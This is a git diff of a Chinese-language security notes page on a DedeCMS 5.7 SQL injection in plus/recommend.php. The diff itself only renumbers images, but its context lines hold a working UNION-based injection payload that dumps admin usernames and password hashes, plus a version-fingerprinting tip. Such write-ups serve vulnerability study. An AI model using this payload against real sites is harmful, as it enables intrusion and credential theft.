@@ -12,7 +12,7 @@ description: 记录DedeCMS5.7漏洞信息
 
 查看系统的发布日期，直接访问 网站url/data/admin/ver.txt
 
-![](../.gitbook/assets/image%20%2884%29.png)
+![](../.gitbook/assets/image%20%2885%29.png)
 
 此时间发布的版本在plus/recommend.php中存在注入漏洞，在此演示直接爆出用户名和密码散列值的payload
 
@@ -20,13 +20,13 @@ description: 记录DedeCMS5.7漏洞信息
 /plus/recommend.php?action=&aid=1&_FILES[type][tmp_name]=\' or mid=@`\'` /*!50000union*//*!50000select*/1,2,3,(select CONCAT(0x7c,userid,0x7c,pwd)+from+`%23@__admin` limit+0,1),5,6,7,8,9%23@`\'`+&_FILES[type][name]=1.jpg&_FILES[type][type]=application/octet-stream&_FILES[type][size]=111
 ```
 
-![&#x6F0F;&#x6D1E;&#x8868;&#x73B0;](../.gitbook/assets/image%20%28100%29.png)
+![&#x6F0F;&#x6D1E;&#x8868;&#x73B0;](../.gitbook/assets/image%20%28101%29.png)
 
 ## 漏洞分析
 
 打开recommend.php,查看代码，第12行程序引入了一个common.inc.php
 
-![](../.gitbook/assets/image%20%2878%29.png)
+![](../.gitbook/assets/image%20%2879%29.png)
 
 跟进去看一下
 
